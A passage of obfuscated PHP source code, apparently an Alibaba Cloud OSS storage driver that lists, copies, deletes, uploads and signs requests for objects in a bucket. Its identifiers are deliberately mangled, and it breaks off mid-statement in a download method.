$ñÛ®ßìÃ = 0) { $Â”Şú©Í =& $_SERVER[ïÃ°£«Ê]; $°èğâÖ = trim($°èğâÖ, $Â”Şú©Í[8]); $àç—‚š¼ = empty($°èğâÖ) && $°èğâÖ !== $Â”Şú©Í[228] ? $Â”Şú©Í[12] : $°èğâÖ . $Â”Şú©Í[8]; $†½Ô‰ŒÉ = $Â”Şú©Í[12]; $š³úÖÎ± = 1000; $Å‰ÏíôÇ = $¯××Íùœ = array(); while (!0) { check_abort(); $´³ªÙ· = array($Â”Şú©Í[1683] => $È­ïæÎš, $Â”Şú©Í[1684] => $àç—‚š¼, $Â”Şú©Í[1685] => $š³úÖÎ±, $Â”Şú©Í[1686] => $†½Ô‰ŒÉ); try { $åÌùÒŞÕ = $this->client->listObjects($this->bucket, $´³ªÙ·); } catch (OSS\Core\OssException $ò·¨À’®) { $this->writeLog(__FUNCTION__ . $Â”Şú©Í[212] . $ò·¨À’®->getMessage()); break; } $†½Ô‰ŒÉ = $åÌùÒŞÕ->getNextMarker(); $‡òçÒÀô = $åÌùÒŞÕ->getObjectList(); $İ‡Ê°ÕÙ = $åÌùÒŞÕ->getPrefixList(); foreach ($‡òçÒÀô as $Î£Ù’å) { if ($Î£Ù’å->getKey() == $àç—‚š¼) { continue; } $öŒŸŠ½¦ = $Î£Ù’å->getKey(); $ïÎÛëÒ = $Î£Ù’å->getSize(); $­Óà›åÁ = $Î£Ù’å->getLastModified(); $€ëõ˜’½ = trim($Î£Ù’å->getETag(), $Â”Şú©Í[118]); $…×‰êğÃ = $ñÛ®ßìÃ ? array($Â”Şú©Í[32] => $öŒŸŠ½¦, $Â”Şú©Í[79] => $ïÎÛëÒ, $Â”Şú©Í[204] => strtotime($­Óà›åÁ), $Â”Şú©Í[1687] => $€ëõ˜’½) : $öŒŸŠ½¦; $ÖÅ•ÈÓã = $ïÎÛëÒ == 0 && substr($öŒŸŠ½¦, strlen($öŒŸŠ½¦) - 1, 1) == $Â”Şú©Í[8] ? !0 : !1; $‡Ø¥·š£ = array($Â”Şú©Í[79] => $ïÎÛëÒ, $Â”Şú©Í[1688] => $ïÎÛëÒ, $Â”Şú©Í[88] => strtotime($­Óà›åÁ), $Â”Şú©Í[1689] => $­Óà›åÁ, $Â”Şú©Í[1687] => $€ëõ˜’½); $this->cacheMethodInfoSet($öŒŸŠ½¦, $ÖÅ•ÈÓã, $‡Ø¥·š£); if ($ÖÅ•ÈÓã) { $Å‰ÏíôÇ[] = $öŒŸŠ½¦; continue; } $¯××Íùœ[] = $…×‰êğÃ; } foreach ($İ‡Ê°ÕÙ as $ØüŒÊÅÄ) { $Å‰ÏíôÇ[] = $ØüŒÊÅÄ->getPrefix(); $this->cacheMethodInfoSet($ØüŒÊÅÄ->getPrefix(), !0); } if ($†½Ô‰ŒÉ === $Â”Şú©Í[12]) { break; } } $this->cacheMethodInfoSet($°èğâÖ, !0); return array($Â”Şú©Í[85] => $Å‰ÏíôÇ, $Â”Şú©Í[86] => $¯××Íùœ); } public function listObject($êêıçÜ†, $ü„ì„àú = '') { $ó€ğ™¯Ó =& $_SERVER[ïÃ°£«Ê]; $êêıçÜ† = trim($êêıçÜ†, $ó€ğ™¯Ó[8]); $‡Ç»Éİº = empty($êêıçÜ†) && $êêıçÜ† !== $ó€ğ™¯Ó[228] ? $ó€ğ™¯Ó[12] : $êêıçÜ† . $ó€ğ™¯Ó[8]; $¸àÌÈŒ = $ó€ğ™¯Ó[12]; $Ä€áğß = 1000; $ü¯¦ú¥ş = $¥½üÚÑ  = array(); while (!0) { check_abort(); $—ÍÇîÎ– = array($ó€ğ™¯Ó[1683] => $ü„ì„àú, $ó€ğ™¯Ó[1684] => $‡Ç»Éİº, $ó€ğ™¯Ó[1685] => $Ä€áğß, $ó€ğ™¯Ó[1686] => $¸àÌÈŒ); try { $ìÌà‹ñ = $this->client->listObjects($this->bucket, $—ÍÇîÎ–); } catch (OSS\Core\OssException $şş‹²‰) { $this->writeLog(__FUNCTION__ . $ó€ğ™¯Ó[212] . $şş‹²‰->getMessage()); break; } $¸àÌÈŒ = $ìÌà‹ñ->getNextMarker(); $…²Ê»‹Ú = $ìÌà‹ñ->getObjectList(); foreach ($…²Ê»‹Ú as $»ˆ¢¶Å’) { if ($»ˆ¢¶Å’->getKey() == $‡Ç»Éİº) { continue; } $¾“É”¨é = $»ˆ¢¶Å’->getKey(); $Ö§Æéñ = $»ˆ¢¶Å’->getSize(); $¦ô¼ùËà = $Ö§Æéñ == 0 && substr($¾“É”¨é, strlen($¾“É”¨é) - 1, 1) == $ó€ğ™¯Ó[8] ? !0 : !1; if ($¦ô¼ùËà) { continue; } $¥½üÚÑ [] = $Ö§Æéñ . $ó€ğ™¯Ó[212] . $¾“É”¨é; } if ($¸àÌÈŒ === $ó€ğ™¯Ó[12]) { break; } } return array($ó€ğ™¯Ó[85] => $ü¯¦ú¥ş, $ó€ğ™¯Ó[86] => $¥½üÚÑ ); } public function copyFile($—ŒÕ¯–², $Äìí‘Ë‰) { $¹ò˜²—Ÿ = $this->size($—ŒÕ¯–²); if ($¹ò˜²—Ÿ < 1024 * 1024 * 1024) { try { $this->client->copyObject($this->bucket, $—ŒÕ¯–², $this->bucket, $this->pathEncode($Äìí‘Ë‰)); } catch (OSS\Core\OssException $‚¸å¾Ìí) { $this->writeLog(__FUNCTION__ . $_SERVER[ïÃ°£«Ê][212] . $‚¸å¾Ìí->getMessage()); return !1; } return $this->getPathOuter($Äìí‘Ë‰); } $†°ÚĞ¹£ = $this->multiCopyObject($—ŒÕ¯–², $Äìí‘Ë‰, $¹ò˜²—Ÿ); return $†°ÚĞ¹£ ? $this->getPathOuter($Äìí‘Ë‰) : !1; } private function multiCopyObject($ÛíÚŠÕÑ, $ÑÜÏ¡€¨, $Å‘óøÃ¶) { $äéË±õò =& $_SERVER[ïÃ°£«Ê]; try { $§ã×¡à´ = array(); if ($Ç„ñ¼å = $this->hashMd5($ÛíÚŠÕÑ)) { $§ã×¡à´ = array(OSS\OssClient::OSS_HEADERS => array($äéË±õò[1690] => $Ç„ñ¼å)); } $õöñ•à· = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($ÑÜÏ¡€¨), $§ã×¡à´); $†¨ÂÒÚ = 1; $ÃÛªğÄÛ = 0; $€ÚÕœü = array(); $¢£Ú¯Š¬ = 1024 * 1024 * 10; $œññùÛÙ = $this->client->generateMultiuploadParts($Å‘óøÃ¶, $¢£Ú¯Š¬); foreach ($œññùÛÙ as $«â·Ô÷Ã => $Ì­ê†›) { $ÁŒÈ‡ˆ¤ = $ÃÛªğÄÛ + (int) $Ì­ê†›[$äéË±õò[1691]]; $Ÿ¯Ø¡™« = (int) $Ì­ê†›[$äéË±õò[412]] + $ÁŒÈ‡ˆ¤ - 1; $“ëÄ„ŠÜ = array($äéË±õò[164] => $ÁŒÈ‡ˆ¤, $äéË±õò[165] => $Ÿ¯Ø¡™«); $€ÚÕœü[] = $this->client->uploadPartCopy($this->bucket, $ÛíÚŠÕÑ, $this->bucket, $this->pathEncode($ÑÜÏ¡€¨), $†¨ÂÒÚ, $õöñ•à·, $“ëÄ„ŠÜ); $†¨ÂÒÚ = $†¨ÂÒÚ + 1; } $í¦Õ¶ñØ = array(); foreach ($€ÚÕœü as $«â·Ô÷Ã => $Ó¡¤×ú°) { $í¦Õ¶ñØ[] = array($äéË±õò[297] => $«â·Ô÷Ã + 1, $äéË±õò[298] => $Ó¡¤×ú°); } $this->client->completeMultipartUpload($this->bucket, $this->pathEncode($ÑÜÏ¡€¨), $õöñ•à·, $í¦Õ¶ñØ); } catch (OSS\Core\OssException $Ê†äÒ»Ô) { $this->writeLog(__FUNCTION__ . $äéË±õò[212] . $Ê†äÒ»Ô->getMessage()); return !1; } return !0; } public function moveFile($¹•øé“², $¦Ì±ï°) { if ($this->copyFile($¹•øé“², $¦Ì±ï°)) { $this->remove($¹•øé“²); return $this->getPathOuter($¦Ì±ï°); } return !1; } public function delFile($ÕãÖå™à) { try { $this->client->deleteObject($this->bucket, $this->pathEncode($ÕãÖå™à)); } catch (OSS\Core\OssException $ÜÔŞ¾”§) { $this->writeLog(__FUNCTION__ . $_SERVER[ïÃ°£«Ê][212] . $ÜÔŞ¾”§->getMessage()); return !1; } return !0; } public function delFolder($Áˆ®–Åì) { $ä±ìî¿ª =& $_SERVER[ïÃ°£«Ê]; if (!$this->exist($Áˆ®–Åì)) { return !0; } $this->listItemCache = !1; $©¡ò¡…Ò = $this->fileList($Áˆ®–Åì); $this->listItemCache = !0; $”øÚ°è = trim($Áˆ®–Åì, $ä±ìî¿ª[8]) . $ä±ìî¿ª[8]; if (!empty($Áˆ®–Åì) && $Áˆ®–Åì !== $ä±ìî¿ª[228] && !in_array($”øÚ°è, $©¡ò¡…Ò[$ä±ìî¿ª[85]])) { $©¡ò¡…Ò[$ä±ìî¿ª[85]][] = $”øÚ°è; } $ÕÜ†Èº = $this->delByBatch($©¡ò¡…Ò[$ä±ìî¿ª[86]]); if (!$ÕÜ†Èº) { return !1; } $ÕÜ†Èº = $this->delByBatch($©¡ò¡…Ò[$ä±ìî¿ª[85]]); if (!$ÕÜ†Èº) { return !1; } return $this->delFile($”øÚ°è); } private function delByBatch($¾«ÚäŠ—) { foreach (array_chunk($¾«ÚäŠ—, 1000) as $÷¾ÏÅ) { try { $this->client->deleteObjects($this->bucket, $÷¾ÏÅ); } catch (OSS\Core\OssException $³ŠŒ³ºè) { $this->writeLog(__FUNCTION__ . $_SERVER[ïÃ°£«Ê][212] . $³ŠŒ³ºè->getMessage()); return !1; } } return !0; } public function rename($è±è±¶, $û£…ÁÒ˜) { return $this->renameObject($è±è±¶, $û£…ÁÒ˜); } private function fileInfo($³ˆûíîş, $ğ²Èãú = false, $™íŠá‰ = array()) { $åÁÙ‡ ¢ =& $_SERVER[ïÃ°£«Ê]; $½ºµÖØÆ = array($åÁÙ‡ ¢[32] => $this->pathThis($³ˆûíîş), $åÁÙ‡ ¢[87] => $this->getPathOuter($³ˆûíîş), $åÁÙ‡ ¢[33] => $åÁÙ‡ ¢[230], $åÁÙ‡ ¢[79] => isset($™íŠá‰[$åÁÙ‡ ¢[79]]) ? $™íŠá‰[$åÁÙ‡ ¢[79]] : 0, $åÁÙ‡ ¢[166] => $this->ext($³ˆûíîş)); if ($ğ²Èãú) { return $½ºµÖØÆ; } $½ºµÖØÆ[$åÁÙ‡ ¢[231]] = $½ºµÖØÆ[$åÁÙ‡ ¢[88]] = 0; $½ºµÖØÆ[$åÁÙ‡ ¢[232]] = $½ºµÖØÆ[$åÁÙ‡ ¢[233]] = !0; if (empty($™íŠá‰)) { $çÆÊó¹¤ = $this->objectMeta($³ˆûíîş); if (!$çÆÊó¹¤) { return $½ºµÖØÆ; } $™íŠá‰ = array($åÁÙ‡ ¢[88] => strtotime($çÆÊó¹¤[$åÁÙ‡ ¢[1689]]), $åÁÙ‡ ¢[79] => $çÆÊó¹¤[$åÁÙ‡ ¢[1688]] + 0, $åÁÙ‡ ¢[1687] => $çÆÊó¹¤[$åÁÙ‡ ¢[1687]]); } if (isset($™íŠá‰[$åÁÙ‡ ¢[1687]]) && $™íŠá‰[$åÁÙ‡ ¢[1687]]) { $½ºµÖØÆ[$åÁÙ‡ ¢[235]] = trim($™íŠá‰[$åÁÙ‡ ¢[1687]], $åÁÙ‡ ¢[118]); } if (isset($™íŠá‰[$åÁÙ‡ ¢[79]])) { $½ºµÖØÆ[$åÁÙ‡ ¢[79]] = $™íŠá‰[$åÁÙ‡ ¢[79]]; } if (isset($™íŠá‰[$åÁÙ‡ ¢[88]])) { $½ºµÖØÆ[$åÁÙ‡ ¢[88]] = $™íŠá‰[$åÁÙ‡ ¢[88]]; } if (isset($™íŠá‰[$åÁÙ‡ ¢[204]]) && !trim($½ºµÖØÆ[$åÁÙ‡ ¢[88]])) { $½ºµÖØÆ[$åÁÙ‡ ¢[88]] = $™íŠá‰[$åÁÙ‡ ¢[204]]; } return $½ºµÖØÆ; } private function folderInfo($÷‚ÕÉ÷¡, $È¾¶Ãª = false, $»± •Ÿ¤ = array()) { $’Â¢åÔµ =& $_SERVER[ïÃ°£«Ê]; $Ë„£¹Ç± = array($’Â¢åÔµ[32] => $this->pathThis($÷‚ÕÉ÷¡), $’Â¢åÔµ[87] => $this->getPathOuter($’Â¢åÔµ[8] . $÷‚ÕÉ÷¡), $’Â¢åÔµ[33] => $’Â¢åÔµ[78]); if ($È¾¶Ãª) { return $Ë„£¹Ç±; } $Ë„£¹Ç±[$’Â¢åÔµ[231]] = $Ë„£¹Ç±[$’Â¢åÔµ[88]] = 0; $Ë„£¹Ç±[$’Â¢åÔµ[232]] = $Ë„£¹Ç±[$’Â¢åÔµ[233]] = !0; if (empty($»± •Ÿ¤)) { $÷‚ÕÉ÷¡ = rtrim($÷‚ÕÉ÷¡, $’Â¢åÔµ[8]) . $’Â¢åÔµ[8]; $¾„ˆ©ç = $this->objectMeta($÷‚ÕÉ÷¡); if (!$¾„ˆ©ç) { return $Ë„£¹Ç±; } $»± •Ÿ¤ = array($’Â¢åÔµ[231] => $¾„ˆ©ç[$’Â¢åÔµ[595]][$’Â¢åÔµ[1692]], $’Â¢åÔµ[88] => strtotime($¾„ˆ©ç[$’Â¢åÔµ[1689]])); } if (isset($»± •Ÿ¤[$’Â¢åÔµ[88]])) { $Ë„£¹Ç±[$’Â¢åÔµ[88]] = $»± •Ÿ¤[$’Â¢åÔµ[88]]; } if (isset($»± •Ÿ¤[$’Â¢åÔµ[231]])) { $Ë„£¹Ç±[$’Â¢åÔµ[231]] = $»± •Ÿ¤[$’Â¢åÔµ[231]]; } return $Ë„£¹Ç±; } public function listPath($üÈë¥ª, $§íÀ‚Ïï = false) { $å¾¢…¢ =& $_SERVER[ïÃ°£«Ê]; $•åàæÉ = $this->fileList($üÈë¥ª, $å¾¢…¢[8], !0); foreach ($•åàæÉ[$å¾¢…¢[85]] as $˜Á³û „ => $í—¢™) { $•åàæÉ[$å¾¢…¢[85]][$˜Á³û „] = $this->folderInfo($í—¢™, $§íÀ‚Ïï, $í—¢™); } foreach ($•åàæÉ[$å¾¢…¢[86]] as $˜Á³û „ => $í—¢™) { $•åàæÉ[$å¾¢…¢[86]][$˜Á³û „] = $this->fileInfo($í—¢™[$å¾¢…¢[32]], $§íÀ‚Ïï, $í—¢™); } return $•åàæÉ; } protected function infoChildren($Ÿ¾¼Ä£, &$ñåíÓÂĞ) { $Ñ  á–’ =& $_SERVER[ïÃ°£«Ê]; $ÛËåßÂŒ = $this->fileList($Ÿ¾¼Ä£, $Ñ  á–’[12], !0); $ñåíÓÂĞ[$Ñ  á–’[81]] += count($ÛËåßÂŒ[$Ñ  á–’[85]]); $ñåíÓÂĞ[$Ñ  á–’[80]] += count($ÛËåßÂŒ[$Ñ  á–’[86]]); foreach ($ÛËåßÂŒ[$Ñ  á–’[86]] as $–È¡¾§§) { if (!$–È¡¾§§ || !$–È¡¾§§[$Ñ  á–’[79]]) { continue; } $ñåíÓÂĞ[$Ñ  á–’[79]] += $–È¡¾§§[$Ñ  á–’[79]]; } } public function has($‡Ë¦Š£Ï, $°åŒ¡É· = false, $½ıãÒœï = true) { $ÅÃüÍ =& $_SERVER[ïÃ°£«Ê]; $‡Ë¦Š£Ï = trim($‡Ë¦Š£Ï, $ÅÃüÍ[8]); $¬ºœÊô = empty($‡Ë¦Š£Ï) && $‡Ë¦Š£Ï !== $ÅÃüÍ[228] ? $ÅÃüÍ[12] : $‡Ë¦Š£Ï . $ÅÃüÍ[8]; $ö«¼Ì— = $ÅÃüÍ[12]; $ûŸÊÖ¥÷ = 500; $üÓÄùŒ• = $Ó¨¶’ = 0; while (!0) { check_abort(); $–¸á°›ï = array($ÅÃüÍ[1683] => $ÅÃüÍ[8], $ÅÃüÍ[1684] => $¬ºœÊô, $ÅÃüÍ[1685] => $ûŸÊÖ¥÷, $ÅÃüÍ[1686] => $ö«¼Ì—); try { $¥¬ôàĞ’ = $this->client->listObjects($this->bucket, $–¸á°›ï); } catch (OSS\Core\OssException $É–Â„ú‰) { $this->writeLog(__FUNCTION__ . $ÅÃüÍ[212] . $É–Â„ú‰->getMessage()); break; } $ö«¼Ì— = $¥¬ôàĞ’->getNextMarker(); $³è•ç¥¦ = $¥¬ôàĞ’->getObjectList(); $¼«õ¨»ü = $¥¬ôàĞ’->getPrefixList(); if ($°åŒ¡É·) { if (count($³è•ç¥¦) > 1 || count($³è•ç¥¦) == 1 && $³è•ç¥¦[0]->getKey() != $¬ºœÊô) { $üÓÄùŒ• += count($³è•ç¥¦) - 1; } if (!empty($¼«õ¨»ü)) { $Ó¨¶’ += count($¼«õ¨»ü); } if ($ö«¼Ì— === $ÅÃüÍ[12]) { break; } continue; } if ($½ıãÒœï) { if (!empty($³è•ç¥¦)) { if (count($³è•ç¥¦) > 1 || $³è•ç¥¦[0]->getKey() != $¬ºœÊô) { return !0; } } } else { if (!empty($¼«õ¨»ü)) { return !0; } } if ($ö«¼Ì— === $ÅÃüÍ[12]) { break; } } if ($°åŒ¡É·) { return array($ÅÃüÍ[239] => $üÓÄùŒ•, $ÅÃüÍ[240] => $Ó¨¶’); } return !1; } public function listAll($Ÿ¾©‘ÓÛ) { $“¤Ì«à¥ =& $_SERVER[ïÃ°£«Ê]; $äüÎö¡ = $this->fileList($Ÿ¾©‘ÓÛ, $“¤Ì«à¥[12], !0); $¡†¤ü¢Ö = array_to_keyvalue($äüÎö¡[$“¤Ì«à¥[86]], $“¤Ì«à¥[32]); foreach ($äüÎö¡[$“¤Ì«à¥[85]] as $Úóœ€†³) { if (is_string($Úóœ€†³)) { $¡†¤ü¢Ö[$Úóœ€†³] = array($“¤Ì«à¥[79] => 0); } } return $this->listAllFiles($Ÿ¾©‘ÓÛ, $¡†¤ü¢Ö); } public function canRead($³ÇÑºÀ) { $‡À„ıĞ =& $_SERVER[ïÃ°£«Ê]; $¬İ¢²Â = $this->pathAcl($³ÇÑºÀ); return $¬İ¢²Â == $‡À„ıĞ[1693] || $¬İ¢²Â == $‡À„ıĞ[642] ? !0 : !1; } public function canWrite($Ûó’ÁÅ) { $ˆ“šÖéß = $this->pathAcl($Ûó’ÁÅ); return $ˆ“šÖéß == $_SERVER[ïÃ°£«Ê][642] ? !0 : !1; } public function pathAcl($¬¤ÎÆÛß) { $Ó´ÏÑ½ø =& $_SERVER[ïÃ°£«Ê]; if (empty($this->bucketAcl)) { $this->bucketAcl = $this->client->getBucketAcl($this->bucket); } try { $ªÎË£– = $this->client->getObjectAcl($this->bucket, $this->pathEncode($¬¤ÎÆÛß)); } catch (OSS\Core\OssException $ÇÎ‘òëä) { $this->writeLog(__FUNCTION__ . $Ó´ÏÑ½ø[212] . $ÇÎ‘òëä->getMessage()); return !1; } $åÂîõ¥¡ = $ªÎË£– == $Ó´ÏÑ½ø[37] ? $this->bucketAcl : $ªÎË£–; if ($åÂîõ¥¡ == $Ó´ÏÑ½ø[1694]) { return $Ó´ÏÑ½ø[1693]; } if ($åÂîõ¥¡ == $Ó´ÏÑ½ø[1695]) { return $Ó´ÏÑ½ø[642]; } return $åÂîõ¥¡; } private function chmodPath($ÔúÜµ, $ƒÂıéÑ” = '') { $ÄÔ•÷Ù =& $_SERVER[ïÃ°£«Ê]; $“„è¥¾ = empty($ƒÂıéÑ”) ? $ÄÔ•÷Ù[1695] : $ƒÂıéÑ”; $ÛöİÙò’ = array($ÄÔ•÷Ù[37], $ÄÔ•÷Ù[229], $ÄÔ•÷Ù[1694], $ÄÔ•÷Ù[1695]); if (!in_array($“„è¥¾, $ÛöİÙò’)) { return !1; } try { $this->client->putObjectAcl($this->bucket, $this->pathEncode($ÔúÜµ), $“„è¥¾); } catch (OSS\Core\OssException $óËê÷µ) { $this->writeLog(__FUNCTION__ . $ÄÔ•÷Ù[212] . $óËê÷µ->getMessage()); return !1; } return !0; } public function getContent($û¢¬÷×Ö) { return $this->fileSubstr($û¢¬÷×Ö, -1); } public function setContent($Æí‘»ÌÜ, $§ç’Óê = '') { $„Ú®µÆó =& $_SERVER[ïÃ°£«Ê]; try { $„¹Û«ëı = $this->trafficLimit($„Ú®µÆó[1696]); $ÃÑŠ»¸Ñ = $this->client->putObject($this->bucket, $this->pathEncode($Æí‘»ÌÜ), $§ç’Óê, $„¹Û«ëı); } catch (OSS\Core\OssException $ô½ÀÌ„¡) { $this->writeLog(__FUNCTION__ . $„Ú®µÆó[212] . $ô½ÀÌ„¡->getMessage()); return !1; } $’óÒ¼¬æ = array($„Ú®µÆó[1690] => trim($ÃÑŠ»¸Ñ[$„Ú®µÆó[1687]], $„Ú®µÆó[118]), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($Æí‘»ÌÜ))); $this->updateObjMeta($Æí‘»ÌÜ, $’óÒ¼¬æ); return isset($ÃÑŠ»¸Ñ[$„Ú®µÆó[1697]][$„Ú®µÆó[294]]) ? !0 : !1; } private function updateObjMeta($û²å™·ä, $ ø‡ƒ½Ê) { $û²å™·ä = $this->pathEncode($û²å™·ä); try { $°¥ô¸İ° = array(OSS\OssClient::OSS_HEADERS => $ ø‡ƒ½Ê); $this->client->copyObject($this->bucket, $û²å™·ä, $this->bucket, $û²å™·ä, $°¥ô¸İ°); } catch (OSS\Core\OssException $÷ªˆğ“) { $this->writeLog(__FUNCTION__ . $_SERVER[ïÃ°£«Ê][212] . $÷ªˆğ“->getMessage()); return !1; } return !0; } public function upload($³Êš™‰º, $”Ô™âï, $“öè§ğÅ = false, $œ÷ã×À– = REPEAT_REPLACE) { $£ìƒ×¡í =& $_SERVER[ïÃ°£«Ê]; if (!$”Ô™âï || !@file_exists($”Ô™âï)) { return !1; } $£—óù€Ş = trim($³Êš™‰º, $£ìƒ×¡í[8]); $® ¯†ñØ = array(OSS\OssClient::OSS_CHECK_MD5 => !0, OSS\OssClient::OSS_PART_SIZE => 1024 * 1024 * 10, OSS\OssClient::OSS_HEADERS => array($£ìƒ×¡í[1690] => @md5_file($”Ô™âï)), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($³Êš™‰º))); $® ¯†ñØ = $this->trafficLimit($£ìƒ×¡í[1696], $® ¯†ñØ); try { $this->client->multiuploadFile($this->bucket, $this->pathEncode($£—óù€Ş), $”Ô™âï, $® ¯†ñØ); } catch (OSS\Core\OssException $¨ Í“½Ğ) { $this->writeLog(__FUNCTION__ . $£ìƒ×¡í[212] . $¨ Í“½Ğ->getMessage()); return !1; } return $this->getPathOuter($³Êš™‰º); } public function getHost() { $ä•¤áí› =& $_SERVER[ïÃ°£«Ê]; $åÉÔº­İ = explode($ä•¤áí›[208], parent::getHost()); return $åÉÔº­İ[0] . $ä•¤áí›[208] . $this->bucket . $ä•¤áí›[10] . $åÉÔº­İ[1]; } public function uploadFormData($„øÜÏ£¹, $íŸ«Ÿú‘ = 3600) { $ÔïÌ´ÕÍ =& $_SERVER[ïÃ°£«Ê]; if (!($üû°áòï = $this->getHost())) { return !1; } $ŠÒÓâí¿ = $íŸ«Ÿú‘; $ÚãÕêå½ = date($ÔïÌ´ÕÍ[1698], time() + $ŠÒÓâí¿); $²¶ÃÁëî = new DateTime($ÚãÕêå½); $ıº†é¶¿ = $²¶ÃÁëî->format(DateTime::ISO8601); $¼£Óëš = strpos($ıº†é¶¿, $ÔïÌ´ÕÍ[371]); $ıº†é¶¿ = substr($ıº†é¶¿, 0, $¼£Óëš) . $ÔïÌ´ÕÍ[1699]; $­ùšì“ = 1048576000 * 5; $À¼´ƒ…· = $this->pathFather($„øÜÏ£¹); $ôÚ¬û™ó = array($ÔïÌ´ÕÍ[262] => $ıº†é¶¿, $ÔïÌ´ÕÍ[265] => array(array($ÔïÌ´ÕÍ[1700], 0, $­ùšì“), array($ÔïÌ´ÕÍ[267], $ÔïÌ´ÕÍ[268], $À¼´ƒ…·))); $£‚âÜõà = base64_encode(json_encode($ôÚ¬û™ó)); $ğõçäÏÛ = base64_encode(hash_hmac($ÔïÌ´ÕÍ[1526], $£‚âÜõà, $this->secret, !0)); $ëâ®í…® = array($ÔïÌ´ÕÍ[1701] => $this->accessKey, $ÔïÌ´ÕÍ[277] => $£‚âÜõà, $ÔïÌ´ÕÍ[270] => $ÔïÌ´ÕÍ[261], $ÔïÌ´ÕÍ[1702] => $ğõçäÏÛ, $ÔïÌ´ÕÍ[206] => $üû°áòï); $ëâ®í…® = $this->trafficLimit($ÔïÌ´ÕÍ[1696], $ëâ®í…®, !0); return $ëâ®í…®; } public function uploadMultiData($•ô·çôÈ, $ìâ†§» = 3600) { $ª˜øÜ£á =& $_SERVER[ïÃ°£«Ê]; if (!($µ¥Éâ‹¼ = $this->getHost())) { return !1; } $îç›ÀˆÁ = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($•ô·çôÈ)); return array($ª˜øÜ£á[281] => $îç›ÀˆÁ, $ª˜øÜ£á[206] => $µ¥Éâ‹¼ . $ª˜øÜ£á[8] . $this->pathEncode($•ô·çôÈ), $ª˜øÜ£á[282] => gmdate($ª˜øÜ£á[1703]), $ª˜øÜ£á[95] => $•ô·çôÈ); } public function uploadMultiAuth($Şº±¿Ÿ, $ÑÎÜ¹®¤ = array()) { if (isset($ÑÎÜ¹®¤[$_SERVER[ïÃ°£«Ê][283]])) { return $this->uploadPartAuth($Şº±¿Ÿ, $ÑÎÜ¹®¤); } return $this->uploadListAuth($Şº±¿Ÿ, $ÑÎÜ¹®¤); } private function uploadPartAuth($û¦³ïá, $½£‰¼­Ø = array()) { $ÃÑâ¹„ì =& $_SERVER[ïÃ°£«Ê]; $€Ïñ®© = $½£‰¼­Ø[$ÃÑâ¹„ì[95]]; $°ûÍ¸¸· = $this->_getUploadAuth($€Ïñ®©, $½£‰¼­Ø); $À³ÙÔ•Ì = array($ÃÑâ¹„ì[286] => $°ûÍ¸¸·[$ÃÑâ¹„ì[286]], $ÃÑâ¹„ì[282] => $°ûÍ¸¸·[$ÃÑâ¹„ì[282]]); if (isset($°ûÍ¸¸·[$ÃÑâ¹„ì[1704]])) { $À³ÙÔ•Ì[$ÃÑâ¹„ì[1704]] = $°ûÍ¸¸·[$ÃÑâ¹„ì[1704]]; } return $À³ÙÔ•Ì; } private function uploadListAuth($»‰ƒÏÌß, $áøŞÚËş = array()) { $ŠØÌøŒ =& $_SERVER[ïÃ°£«Ê]; $ÜÁÇß¼¦ = $áøŞÚËş[$ŠØÌøŒ[95]]; $¤¤€Õ‹ = $áøŞÚËş[$ŠØÌøŒ[281]]; $õùú¹ó = $this->client->listParts($this->bucket, $this->pathEncode($ÜÁÇß¼¦), $¤¤€Õ‹); $„»¹àî« = $õùú¹ó->getListPart(); $˜¦‰éó = array(); foreach ($„»¹àî« as $Æ”¿»º) { $˜¦‰éó[] = array($ŠØÌøŒ[297] => $Æ”¿»º->getPartNumber(), $ŠØÌøŒ[298] => trim($Æ”¿»º->getETag(), $ŠØÌøŒ[118])); } if (!$˜¦‰éó) { return !1; } $®ŸÇ«¢ä = $this->_getUploadAuth($ÜÁÇß¼¦, $áøŞÚËş); return array($ŠØÌøŒ[286] => $®ŸÇ«¢ä[$ŠØÌøŒ[286]], $ŠØÌøŒ[282] => $®ŸÇ«¢ä[$ŠØÌøŒ[282]], $ŠØÌøŒ[289] => $˜¦‰éó); } private function _getUploadAuth($Öı¥¸ù—, $¯ÒøˆŞö) { $èšÍÌŸ¤ =& $_SERVER[ïÃ°£«Ê]; $‹õ÷ÑÈ = gmdate($èšÍÌŸ¤[1703]); $§ºªæ°• = isset($¯ÒøˆŞö[$èšÍÌŸ¤[283]]) ? $èšÍÌŸ¤[253] : $èšÍÌŸ¤[288]; $á±íÙ®ü = array_intersect_key($¯ÒøˆŞö, array_flip(array($èšÍÌŸ¤[283], $èšÍÌŸ¤[281]))); ksort($á±íÙ®ü); $ñ»‰‚Üè = $á±íÙ®ü ? $èšÍÌŸ¤[76] . http_build_query($á±íÙ®ü, null, $èšÍÌŸ¤[284], PHP_QUERY_RFC3986) : $èšÍÌŸ¤[12]; $•ßò­šÆ = array($§ºªæ°•, $èšÍÌŸ¤[12], $èšÍÌŸ¤[120], $‹õ÷ÑÈ, "\x78\55\x6f\x73\163\x2d\x64\x61\x74\x65\x3a{$‹õ÷ÑÈ}", $èšÍÌŸ¤[8] . $this->bucket . $èšÍÌŸ¤[8] . $Öı¥¸ù— . $ñ»‰‚Üè); if (isset($¯ÒøˆŞö[$èšÍÌŸ¤[283]])) { $æŠ‰ËëÈ = $this->trafficLimit($èšÍÌŸ¤[1696], array(), !0); if ($æŠ‰ËëÈ) { $Öı¥¸ù— = $èšÍÌŸ¤[1704]; array_splice($•ßò­šÆ, 5, 0, $Öı¥¸ù— . $èšÍÌŸ¤[4] . $æŠ‰ËëÈ[$Öı¥¸ù—]); } } $Ì·—‘ï¬ = implode($èšÍÌŸ¤[285], $•ßò­šÆ); $–Çİ¿¾ğ = base64_encode(hash_hmac($èšÍÌŸ¤[1526], $Ì·—‘ï¬, $this->secret, !0)); $†µ¼Öáè = $èšÍÌŸ¤[1673] . $this->accessKey . $èšÍÌŸ¤[4] . $–Çİ¿¾ğ; $ÍìûÉ—Õ = array($èšÍÌŸ¤[286] => $†µ¼Öáè, $èšÍÌŸ¤[282] => $‹õ÷ÑÈ); if (!empty($æŠ‰ËëÈ)) { $ÍìûÉ—Õ = array_merge($ÍìûÉ—Õ, $æŠ‰ËëÈ); } return $ÍìûÉ—Õ; } public function download($ä¡Ñ‹Âı, $‘Ø§™Ïì) { $ã³¥‹“• =& $_SERVER[ïÃ°£«Ê]; if ($this->isFolder($ä¡Ñ‹Âı)) { return !1; } try { $×ÜÏûğ§ = array(OSS\OssClient::OSS_FILE_DOWNLOAD => 